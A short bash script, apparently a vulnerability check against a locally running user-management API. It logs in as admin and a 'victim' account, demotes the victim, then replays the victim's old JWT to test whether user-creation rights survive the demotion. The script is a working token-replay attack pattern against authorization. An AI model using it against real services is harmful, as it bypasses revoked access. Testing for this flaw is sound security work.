#!/bin/bash
API=http://localhost:8080/api/v1
PW='Thesis-Pass-1234'
jqpy(){ python3 -c "import sys,json;d=json.load(sys.stdin);print($1)" 2>/dev/null; }
claimval(){ python3 -c "import sys,base64,json;t='$1'.split('.')[1];t+='='*(-len(t)%4);print(json.loads(base64.urlsafe_b64decode(t)).get('$2'))" 2>/dev/null; }
login(){ curl -s -X POST $API/auth/login -H 'Content-Type: application/json' -d "{\"username\":\"$1\",\"password\":\"$2\"}" | jqpy "d.get('access_token','')"; }
writecode(){ local n="probe-$RANDOM$RANDOM"; curl -s -o /dev/null -w '%{http_code}' -X POST $API/users -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"username\":\"$n\",\"email\":\"$n@probe.test\",\"password\":\"$PW\",\"is_admin\":false}"; }

A=$(login admin "$PW"); echo "admin is_admin=$(claimval "$A" is_admin)"
VID=$(curl -s "$API/users?page_size=200" -H "Authorization: Bearer $A" | python3 -c "import sys,json;d=json.load(sys.stdin);u=d if isinstance(d,list) else d.get('items',d.get('users',d.get('data',[])));print([x['id'] for x in u if x.get('username')=='victim'][0])" 2>/dev/null)
echo "victim id=$VID"
VOLD=$(login victim "$PW"); echo "[A] V_OLD is_admin=$(claimval "$VOLD" is_admin)"
echo "[B] source victim write (expect 2xx) -> $(writecode "$VOLD")"
VW=$(login viewer "$PW"); echo "[C] viewer write (expect 403) -> $(writecode "$VW")"
echo "[D] demote victim is_admin=false (expect 2xx) -> $(curl -s -o /dev/null -w '%{http_code}' -X PATCH $API/users/$VID -H "Authorization: Bearer $A" -H 'Content-Type: application/json' -d '{"is_admin":false}')"
VNEW=$(login victim "$PW"); echo "[E] fresh victim is_admin=$(claimval "$VNEW" is_admin) write (expect 403) -> $(writecode "$VNEW")"
echo "[F] REPLAY V_OLD write after demotion (vuln=2xx bug / fixed=403) -> $(writecode "$VOLD")"
